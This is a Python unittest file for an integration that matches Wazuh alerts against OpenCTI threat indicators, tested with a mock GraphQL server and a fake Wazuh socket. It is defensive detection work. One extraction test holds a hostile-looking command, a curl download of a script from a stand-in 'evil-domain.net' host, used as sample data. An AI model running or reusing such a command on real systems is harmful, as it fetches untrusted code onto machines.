#!/usr/bin/env python3
"""
Offline tests for integration/custom-opencti.py - no Wazuh or OpenCTI needed.

  python3 tests/test_integration.py -v

A mock OpenCTI GraphQL server (127.0.0.1) answers the IOC query / sighting / identity calls, and a
Unix datagram socket plays the role of Wazuh's analysisd queue. This checks OUR code paths
(extraction, scoring, event schema, sighting dedupe, error handling). It does not validate your
OpenCTI version's schema - for that use the live test in docs/TESTING.md.
"""
import importlib.util
import json
import os
import socket
import tempfile
import threading
import unittest
from http.server import BaseHTTPRequestHandler, HTTPServer

HERE = os.path.dirname(os.path.abspath(__file__))
SCRIPT = os.path.join(HERE, "..", "integration", "custom-opencti.py")
BAD_IP = "93.125.114.57"

os.environ["no_proxy"] = os.environ["NO_PROXY"] = "127.0.0.1,localhost"


def load_module():
    spec = importlib.util.spec_from_file_location("custom_opencti", SCRIPT)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


class Mock:
    score = 80
    calls = []


def indicator(score):
    return {
        "id": "ind-1", "name": BAD_IP, "valid_until": "2030-01-01T00:00:00.000Z", "revoked": False,
        "confidence": 75, "x_opencti_score": score, "x_opencti_detection": True,
        "indicator_types": ["malicious-activity"], "x_mitre_platforms": [], "pattern_type": "stix",
        "pattern": "[ipv4-addr:value = '%s']" % BAD_IP,
        "objectLabel": [{"value": "malware"}], "killChainPhases": [{"kill_chain_name": "mitre-attack"}],
        "createdBy": {"name": "AbuseIPDB"}, "externalReferences": {"edges": []},
    }


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *a):
        pass

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        q, v = body["query"], body.get("variables", {})
        Mock.calls.append(("auth:" + self.headers.get("Authorization", ""), q.strip()[:40]))
        if "query IoCs" in q:
            hit = BAD_IP in json.dumps(v)
            ind = indicator(Mock.score)
            data = {"indicators": {"edges": [{"node": ind}] if hit else []},
                    "stixCyberObservables": {"edges": [{"node": {
                        "id": "obs-1", "type": "IPv4-Addr", "observable_value": BAD_IP, "value": BAD_IP,
                        "x_opencti_score": Mock.score, "objectLabel": [], "externalReferences": {"edges": []},
                        "indicators": {"edges": [{"node": ind}]}, "stixCoreRelationships": {"edges": []}}}]
                        if hit else []}}
            out = {"data": data}
        elif "CreateSighting" in q:
            out = {"data": {"stixSightingRelationshipAdd": {"id": "sight-1"}}}
        elif "identities(" in q:
            out = {"data": {"identities": {"edges": [{"node": {"id": "ident-1", "name": "Wazuh SIEM"}}]}}}
        else:
            out = {"data": {}}
        raw = json.dumps(out).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(raw)))
        self.end_headers()
        self.wfile.write(raw)


def make_alert(**over):
    alert = {
        "id": "1700000000.1", "timestamp": "2026-10-03T10:00:00.123+0000",
        "rule": {"id": "5760", "description": "sshd: authentication failed", "groups": ["sshd", "authentication_failed"]},
        "agent": {"id": "001", "name": "ubuntu1", "ip": "192.168.122.63"},
        "data": {"srcip": BAD_IP}, "full_log": "Failed password for root from %s port 22 ssh2" % BAD_IP,
    }
    alert.update(over)
    return alert


class Base(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = HTTPServer(("127.0.0.1", 0), Handler)
        cls.port = cls.srv.server_address[1]
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.oc = load_module()
        oc = self.oc
        oc.URL = "http://127.0.0.1:%d/graphql" % self.port
        oc.TOKEN = "test-token"
        oc.LOG_FILE = os.path.join(self.tmp, "integrations.log")
        oc.SOCKET_ADDR = os.path.join(self.tmp, "queue.sock")
        oc.STATE = oc.StateStore(os.path.join(self.tmp, "state.json"))
        oc.WAZUH_IDENTITY_ID = ""
        Mock.score, Mock.calls = 80, []
        self.rx = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.rx.bind(oc.SOCKET_ADDR)
        self.rx.settimeout(0.3)

    def tearDown(self):
        self.rx.close()

    def drain(self):
        out = []
        while True:
            try:
                out.append(self.rx.recv(65535).decode())
            except socket.timeout:
                return out

    @staticmethod
    def payload(msg):
        return json.loads(msg.split("opencti:", 1)[1])

    def sightings(self):
        return [c for c in Mock.calls if "mutation CreateSighting" in c[1]]


class ExtractionTests(Base):
    def test_hash_named_file_and_syscheck_hashes(self):
        a = {"rule": {"groups": ["syscheck_entry_added"]},
             "syscheck": {"path": "/tmp/%s.exe" % ("a" * 64), "sha256_after": "b" * 64, "md5_after": "c" * 32}}
        got = {(i["type"], i["value"]) for i in self.oc.extract_iocs(a)}
        self.assertIn(("sha256", "a" * 64), got)
        self.assertIn(("sha256", "b" * 64), got)
        self.assertIn(("md5", "c" * 32), got)

    def test_sysmon_imphash_not_taken_as_md5(self):
        a = {"rule": {"groups": ["sysmon_event1"]}, "data": {"win": {"eventdata": {
            "hashes": "SHA256=%s,IMPHASH=%s" % ("2" * 64, "3" * 32)}}}}
        got = {(i["type"], i["value"]) for i in self.oc.extract_iocs(a)}
        self.assertIn(("sha256", "2" * 64), got)
        self.assertNotIn(("md5", "3" * 32), got)

    def test_file_extensions_are_not_domains_and_private_ips_skipped(self):
        a = {"rule": {"groups": ["sysmon_event1"]}, "data": {"win": {"eventdata": {
            "commandLine": "curl http://evil-domain.net/p.sh -o update.py 8.8.8.8 192.168.1.5"}}}}
        got = {(i["type"], i["value"]) for i in self.oc.extract_iocs(a)}
        self.assertIn(("domain", "evil-domain.net"), got)
        self.assertNotIn(("domain", "update.py"), got)
        self.assertNotIn(("domain", "p.sh"), got)
        self.assertIn(("ipv4", "8.8.8.8"), got)
        self.assertNotIn(("ipv4", "192.168.1.5"), got)

    def test_auditd_syscall_only_proctitle(self):
        hexs = b"ping\x00-c\x002\x00193.32.162.204".hex().upper()
        a = {"rule": {"groups": ["audit_command"]}, "full_log": "type=PROCTITLE proctitle=" + hexs,
             "data": {"audit": {"command": "ping", "exe": "/usr/bin/ping"}}}
        self.assertIn(("ipv4", "193.32.162.204"), {(i["type"], i["value"]) for i in self.oc.extract_iocs(a)})

    def test_auditd_execve_unmonitored_binary_skipped(self):
        a = {"rule": {"groups": ["audit_command"]}, "data": {"audit": {"execve": {"a0": "ls", "a1": "8.8.8.8"}}}}
        self.assertEqual(self.oc.extract_iocs(a), [])

    def test_execve_integer_sort(self):
        ex = {"a0": "curl", "a1": "x", "a10": "last", "a2": "y"}
        self.assertEqual(self.oc._build_execve_string(ex).split()[-1], "last")

    def test_hashes_prioritised_before_filenames(self):
        a = {"rule": {"groups": ["syscheck_file"]}, "syscheck": {"path": "/x/y", "sha256_after": "d" * 64}}
        self.assertEqual(self.oc.extract_iocs(a)[0]["type"], "sha256")


class FlowTests(Base):
    def test_match_emits_event_with_agent_prefix_and_creates_sighting(self):
        self.oc.process_alert(make_alert())
        msgs = self.drain()
        self.assertTrue(msgs, "no events received on the fake Wazuh socket")
        self.assertTrue(msgs[0].startswith("1:[001] (ubuntu1) 192.168.122.63->opencti:"))
        ev = self.payload(msgs[0])
        self.assertEqual(ev["integration"], "opencti")
        self.assertEqual(ev["opencti"]["event_type"], "indicator_pattern_match")
        self.assertEqual(ev["opencti"]["indicator"]["x_opencti_score"], 80)
        self.assertEqual(ev["opencti"]["sighting_id"], "sight-1")
        self.assertEqual(ev["opencti"]["source"]["rule_id"], "5760")
        self.assertEqual(len(self.sightings()), 1)
        self.assertTrue(all(c[0] == "auth:Bearer test-token" for c in Mock.calls))

    def test_observable_with_same_indicator_not_double_reported(self):
        self.oc.process_alert(make_alert())
        types = [self.payload(m)["opencti"]["event_type"] for m in self.drain()]
        self.assertEqual(types, ["indicator_pattern_match"])

    def test_sighting_deduplicated_but_events_still_sent(self):
        self.oc.process_alert(make_alert())
        self.drain()
        self.oc.process_alert(make_alert())
        self.assertEqual(len(self.drain()), 1)
        self.assertEqual(len(self.sightings()), 1)

    def test_different_agent_gets_its_own_sighting(self):
        self.oc.process_alert(make_alert())
        self.oc.process_alert(make_alert(agent={"id": "002", "name": "ubuntu2", "ip": "192.168.122.64"}))
        self.assertEqual(len(self.sightings()), 2)

    def test_low_score_indicator_ignored(self):
        Mock.score = 10
        self.oc.process_alert(make_alert())
        self.assertEqual(self.drain(), [])
        self.assertEqual(self.sightings(), [])

    def test_clean_ioc_produces_nothing(self):
        self.oc.process_alert(make_alert(data={"srcip": "8.8.8.8"}))
        self.assertEqual(self.drain(), [])

    def test_sightings_can_be_disabled(self):
        self.oc.CREATE_SIGHTINGS = False
        self.oc.process_alert(make_alert())
        self.assertEqual(len(self.drain()), 1)
        self.assertEqual(self.sightings(), [])

    def test_configured_identity_skips_lookup(self):
        self.oc.WAZUH_IDENTITY_ID = "cfg-ident"
        self.oc.process_alert(make_alert())
        self.assertFalse([c for c in Mock.calls if "identities(" in c[1]])

    def test_opencti_down_sends_one_error_event(self):
        self.oc.URL = "http://127.0.0.1:1/graphql"
        a = make_alert(data={"srcip": BAD_IP, "dstip": "1.1.1.1"})
        self.oc.process_alert(a)
        msgs = self.drain()
        self.assertEqual(len(msgs), 1)
        self.assertIn("error", self.payload(msgs[0])["opencti"])
        self.assertEqual(self.payload(msgs[0])["opencti"]["event_type"], "error")

    def test_json_conf_override(self):
        conf = os.path.join(self.tmp, "c.json")
        with open(conf, "w") as fh:
            json.dump({"MIN_SCORE": 95, "SIGHTING_IOC_TYPES": ["sha256"], "bogus": 1}, fh)
        self.oc.CONF_FILE = conf
        self.oc.load_conf_overrides()
        self.assertEqual(self.oc.MIN_SCORE, 95)
        self.assertEqual(self.oc.SIGHTING_IOC_TYPES, {"sha256"})
        self.oc.process_alert(make_alert())   # score 80 < 95 now
        self.assertEqual(self.drain(), [])

    def test_alert_timestamp_formats(self):
        self.assertEqual(self.oc._alert_timestamp({"timestamp": "2026-10-03T10:00:00.123+0000"}),
                         "2026-10-03T10:00:00.123Z")


if __name__ == "__main__":
    unittest.main()
